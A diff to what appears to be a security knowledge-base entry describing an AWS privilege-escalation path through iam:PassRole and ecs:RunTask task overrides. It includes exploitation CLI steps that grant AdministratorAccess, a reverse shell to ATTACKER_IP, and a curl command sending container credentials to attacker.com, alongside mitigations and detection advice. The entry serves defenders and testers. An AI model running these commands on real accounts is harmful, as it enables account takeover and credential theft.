@@ -1,7 +1,5 @@
-status: draft
-
 id: ecs-008
-name: "iam:PassRole + ecs:RunTask"
+name: iam:PassRole + ecs:RunTask
 category: new-passrole
 services:
   - iam
@@ -10,17 +8,346 @@ services:
 permissions:
   required:
     - permission: iam:PassRole
-      resourceConstraints: Target role ARN must be in the Resource section
+      resourceConstraints: Must cover both the task role ARN (for the taskRoleArn override) and the execution role ARN defined in the existing task definition — ECS requires PassRole on the execution role even when it is not being changed
     - permission: ecs:RunTask
-      resourceConstraints: An existing task definition must be available
+      resourceConstraints: Must have permission to run tasks in the target cluster; an existing task definition must be available to override
   additional:
     - permission: ecs:ListClusters
-      resourceConstraints: Helpful for finding the cluster name
+      resourceConstraints: Helpful for discovering available ECS clusters
     - permission: ecs:ListTaskDefinitions
-      resourceConstraints: Helpful for finding the task definition names
+      resourceConstraints: Helpful for discovering existing task definitions to exploit with overrides
+    - permission: ecs:DescribeTasks
+      resourceConstraints: Helpful for monitoring task execution status
+    - permission: ec2:DescribeVpcs
+      resourceConstraints: Helpful for finding the default VPC for Fargate network configuration
     - permission: ec2:DescribeSubnets
-      resourceConstraints: Helpful for finding subnets for the network configuration
-    - permission: ec2:DescribeSecurityGroups
-      resourceConstraints: Helpful for finding security groups for the network configuration
+      resourceConstraints: Helpful for finding subnets for Fargate network configuration
 
-description: A principal with `iam:PassRole` and `ecs:RunTask` can override the command which the task definition runs on container startup to ensure they have access to the container. The IMDS credentials can then be extracted which have the permissions of the passed role.
+description: A principal with `iam:PassRole` and `ecs:RunTask` can override an existing ECS task definition's container command and task role at runtime using the `--overrides` parameter — without needing `ecs:RegisterTaskDefinition`. By overriding the `taskRoleArn` with a privileged role (passed via `iam:PassRole`) and the container command with a malicious payload, the attacker causes the Fargate task to execute arbitrary code with the permissions of the passed role. This is a lower-permission variant of ECS-004, removing the requirement for `ecs:RegisterTaskDefinition` by hijacking an existing task definition instead of creating a new one.
+
+prerequisites:
+  admin:
+    - An ECS cluster must exist in the account
+    - An existing task definition must be available in the cluster (no ecs:RegisterTaskDefinition required)
+    - A role must exist that trusts ecs-tasks.amazonaws.com with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+    - A subnet must be available for Fargate launch type network configuration
+  lateral:
+    - An ECS cluster must exist in the account
+    - An existing task definition must be available in the cluster
+    - A role must exist that trusts ecs-tasks.amazonaws.com
+    - A subnet must be available for Fargate launch type network configuration
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: aws sts get-caller-identity
+      description: Get your account ID and verify identity before proceeding
+    - step: 2
+      command: |
+        aws ecs list-clusters \
+          --query 'clusterArns' \
+          --output json
+      description: Discover available ECS clusters in the account
+    - step: 3
+      command: |
+        aws ecs list-task-definitions \
+          --query 'taskDefinitionArns' \
+          --output json
+      description: Discover existing task definitions — select one to hijack with the --overrides parameter (no new task definition registration required)
+    - step: 4
+      command: |
+        aws ec2 describe-vpcs --filters "Name=isDefault,Values=true" --query 'Vpcs[0].VpcId' --output text
+        aws ec2 describe-subnets \
+          --filters "Name=vpc-id,Values=VPC_ID" \
+          --query 'Subnets[0].SubnetId' \
+          --output text
+      description: Find the default VPC and subnet ID for Fargate network configuration
+    - step: 5
+      command: |
+        aws ecs run-task \
+          --cluster CLUSTER_NAME \
+          --task-definition EXISTING_TASK_DEFINITION \
+          --launch-type FARGATE \
+          --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}" \
+          --overrides '{
+            "taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
+            "containerOverrides": [{
+              "name": "CONTAINER_NAME",
+              "command": ["iam", "attach-user-policy", "--user-name", "STARTING_USER", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
+            }]
+          }'
+      description: Run the existing task definition on Fargate, overriding the task role ARN via iam:PassRole and the container command with a payload that escalates the starting principal's privileges
+    - step: 6
+      command: aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN
+      description: Monitor task status until it reaches STOPPED state, then verify privilege escalation was successful
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative task roles** - Very rarely does an ECS task need administrative access. Use the principle of least privilege.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
+  Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificECSRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "ecs-tasks.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+
+  - Monitor CloudTrail for `ecs:RunTask` calls with a `taskRoleArn` in the `overrides` field — this is the specific API pattern that enables this attack
+  - Monitor CloudTrail for ECS task execution by principals who do not usually run tasks
+  - Monitor CloudTrail for roles being passed to ECS that haven't been used before
+  - Monitor and alert on ECS task execution with privileged roles
+  - Regularly audit ECS task definitions for overly permissive defaults — if existing task definitions can be run with any role via overrides, that is the attack surface
+  - Regularly audit all IAM roles that trust the ECS service and down-scope any roles with administrative access
+
+limitations: |
+  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.
+
+  This path requires an existing task definition in the cluster. The `--overrides` parameter allows overriding the `taskRoleArn` and container commands at runtime without creating a new task definition. This path uses the Fargate launch type and does not require an EC2 container instance — see ECS-009 for the EC2 launch type equivalent.
+
+discoveryAttribution:
+  firstDocumented:
+    source: ReverseC Labs
+    date: 2025
+    link: https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path
+  derivativeOf:
+    pathId: ecs-004
+    modification: "Removes the requirement for ecs:RegisterTaskDefinition by using the --overrides parameter to override the task role ARN and container command of an existing task definition at runtime"
+
+references:
+  - title: "Another ECS Privilege Escalation Path"
+    url: "https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path"
+  - title: "Weaponizing AWS ECS Task Definitions to Steal Credentials From Running Containers"
+    url: "https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/"
+  - title: "HackTricks - AWS ECS Privesc"
+    url: "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ecs-privesc/"
+
+relatedPaths:
+  - ecs-004
+  - ecs-005
+  - ecs-007
+  - ecs-009
+
+detectionTools:
+  prowler: https://github.com/prowler-cloud/prowler/blob/eabe4884379070c72e07103f239bac70d31f6320/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L250
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/iam-passrole+ecs-runtask"
+    description: "Deploy Terraform into your own AWS account to practice this attack path"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: |
+        The principal with `iam:PassRole` and `ecs:RunTask` permissions. Can be an IAM user or role. No `ecs:RegisterTaskDefinition` is required — the attack hijacks an existing task definition using the `--overrides` parameter at runtime.
+
+    - id: fargate_task
+      label: New Fargate Task Run (Existing Task Definition)
+      type: resource
+      description: |
+        A new ECS task launched via `ecs:RunTask` against an existing task definition in the cluster. The attacker uses the `--overrides` parameter to replace both the `taskRoleArn` (passing a privileged role via `iam:PassRole`) and the container command with a malicious payload — without needing to register any new task definition.
+
+    - id: target_role
+      label: Existing Role That Trusts the ecs-tasks Service
+      type: principal
+      description: |
+        The IAM role passed to the running task via the `--overrides` `taskRoleArn` field. Must trust `ecs-tasks.amazonaws.com`. Once the task starts, it automatically assumes this role and its temporary credentials are available to the container process. The role's permissions determine the blast radius of the attack.
+
+    - id: method_direct
+      label: "Method 1: Override Command (Direct IAM Elevation)"
+      type: payload
+      color: '#99ccff'
+      description: |
+        Override the container command with an AWS CLI call that directly elevates the starting principal using the task role's credentials. Because the Fargate task runs with the passed role's permissions, any IAM write action the role is authorized for can be used.
+
+        Example override payload:
+        - Attach AdministratorAccess to starting principal: `aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`
+        - Create new admin access keys: `aws iam create-access-key --user-name STARTING_USER`
+        - Add starting principal to admin group: `aws iam add-user-to-group --user-name STARTING_USER --group-name Admins`
+
+        This is the most direct approach but requires the target role to have IAM write permissions.
+
+    - id: method_reverse_shell
+      label: "Method 2: Override Command (Reverse Shell)"
+      type: payload
+      color: '#99ccff'
+      description: |
+        Override the container command with a script that establishes a reverse shell to an attacker-controlled server. This gives the attacker an interactive session running as the task role inside the Fargate container.
+
+        Example override command:
+        ```bash
+        bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+        ```
+
+        The attacker maintains a listener (e.g., `nc -lvnp 4444`) to catch the connection. Once connected, the AWS CLI uses the task role's credentials automatically via the container's IAM metadata, allowing interactive exploration and exploitation.
+
+    - id: method_exfiltration
+      label: "Method 3: Override Command (Credential Exfiltration)"
+      type: payload
+      color: '#99ccff'
+      description: |
+        Override the container command with a script that retrieves the task role's temporary credentials from the container credentials endpoint and exfiltrates them to an attacker-controlled server.
+
+        Example override command:
+        ```bash
+        CREDS=$(curl -s $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
+        curl -X POST https://attacker.com/exfil -d "$CREDS"
+        ```
+
+        ECS tasks receive credentials via the `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` environment variable rather than the EC2 metadata service. The exfiltrated credentials can then be used from any environment until they expire.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: |
+        The target role has AdministratorAccess or equivalent permissions. Using any of the three exploitation methods, the attacker successfully leverages these permissions to gain full administrative access to the AWS account.
+
+    - id: some_perms
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: |
+        The target role has elevated but non-administrative permissions. The attacker can use the task's execution context to access data (S3, RDS, Secrets Manager) or pivot to additional privilege escalation paths, but cannot immediately gain full admin access.
+
+    - id: no_access
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: |
+        The target role has only minimal permissions (e.g., `logs:PutLogEvents`). Regardless of the exploitation method used, the privilege escalation provides limited value beyond what the starting principal already has.
+
+  edges:
+    - from: start
+      to: fargate_task
+      label: iam:PassRole + ecs:RunTask
+      description: |
+        Run an existing task definition on Fargate, using `--overrides` to replace the task role ARN (via `iam:PassRole`) and the container command with a malicious payload. No new task definition registration is required.
+
+        Command:
+        ```bash
+        aws ecs run-task \
+          --cluster CLUSTER_NAME \
+          --task-definition EXISTING_TASK_DEFINITION \
+          --launch-type FARGATE \
+          --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}" \
+          --overrides '{
+            "taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
+            "containerOverrides": [{
+              "name": "CONTAINER_NAME",
+              "command": ["iam", "attach-user-policy", "--user-name", "STARTING_USER", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
+            }]
+          }'
+        ```
+
+    - from: fargate_task
+      to: target_role
+      label: Task assumes role
+      description: |
+        When the Fargate task starts, ECS automatically provides the overridden task role's temporary credentials to the container via the `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` environment variable. The container process runs with the full permissions of the passed role from the moment it starts executing.
+
+    - from: target_role
+      to: method_direct
+      label: Option A
+      branch: A
+      description: |
+        Choose the direct IAM elevation approach: override the container command with an AWS CLI call that directly modifies IAM permissions for the starting principal using the task role's credentials.
+
+    - from: target_role
+      to: method_reverse_shell
+      label: Option B
+      branch: B
+      description: |
+        Choose the reverse shell approach: override the container command with a script that establishes an interactive shell connection back to the attacker, providing hands-on access with the task role's credentials.
+
+    - from: target_role
+      to: method_exfiltration
+      label: Option C
+      branch: C
+      description: |
+        Choose the credential exfiltration approach: override the container command with a script that extracts and sends the task role's temporary credentials to an attacker-controlled endpoint for use outside of ECS.
+
+    - from: method_direct
+      to: admin
+      label: If target role has admin or IAM write permissions
+      branch: A1
+      condition: admin
+      description: |
+        If the target role has AdministratorAccess or IAM write permissions (e.g., `iam:AttachUserPolicy`, `iam:PutUserPolicy`, `iam:AddUserToGroup`, `iam:CreateAccessKey`), the override command successfully elevates the starting principal to administrator.
+
+    - from: method_direct
+      to: some_perms
+      label: If target role has some elevated permissions
+      branch: A2
+      condition: some_permissions
+      description: |
+        If the target role has elevated permissions but lacks IAM write access, the override command can be used to exfiltrate data or perform other privileged actions, but cannot directly modify the starting principal's permissions.
+
+    - from: method_direct
+      to: no_access
+      label: If target role has minimal permissions
+      branch: A3
+      condition: no_permissions
+      description: |
+        If the target role only has minimal permissions, the override command cannot perform useful privileged actions.
+
+    - from: method_reverse_shell
+      to: admin
+      label: If target role has admin permissions
+      branch: B1
+      condition: admin
+      description: |
+        If the target role has AdministratorAccess, the reverse shell provides interactive command-line access with full administrative permissions inside the Fargate container.
+
+    - from: method_reverse_shell
+      to: some_perms
+      label: If target role has some permissions
+      branch: B2
+      condition: some_permissions
+      description: |
+        If the target role has some elevated permissions, the reverse shell allows the attacker to interactively explore and leverage those permissions from within the container environment.
+
+    - from: method_reverse_shell
+      to: no_access
+      label: If target role has minimal permissions
+      branch: B3
+      condition: no_permissions
+      description: |
+        If the target role only has minimal permissions, the reverse shell provides limited value despite offering interactive access.
+
+    - from: method_exfiltration
+      to: admin
+      label: If target role has admin permissions
+      branch: C1
+      condition: admin
+      description: |
+        If the target role has AdministratorAccess, the exfiltrated temporary credentials provide full administrative access that can be used from the attacker's own environment until the credentials expire (typically up to 1 hour).
+
+    - from: method_exfiltration
+      to: some_perms
+      label: If target role has some permissions
+      branch: C2
+      condition: some_permissions
+      description: |
+        If the target role has some elevated permissions, the exfiltrated credentials can be used for data access, reconnaissance, or additional privilege escalation attempts from outside of ECS.
+
+    - from: method_exfiltration
+      to: no_access
+      label: If target role has minimal permissions
+      branch: C3
+      condition: no_permissions
+      description: |
+        If the target role only has minimal permissions, the exfiltrated credentials provide limited value for further attacks.
